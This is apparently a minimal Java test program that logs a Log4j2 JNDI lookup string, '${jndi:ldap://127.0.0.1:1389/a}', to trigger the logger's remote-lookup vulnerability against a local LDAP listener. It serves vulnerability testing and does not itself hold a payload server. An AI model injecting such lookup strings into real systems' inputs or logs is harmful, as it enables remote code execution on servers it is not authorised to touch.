import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class HelloLog4j {

    private static final Logger logger = LogManager.getLogger(HelloLog4j.class);

    public static void main(String[] args) {
        // This log message triggers Log4j2's lookup mechanism
        logger.error("Testing vulnerable path: ${jndi:ldap://127.0.0.1:1389/a}");
    }
}
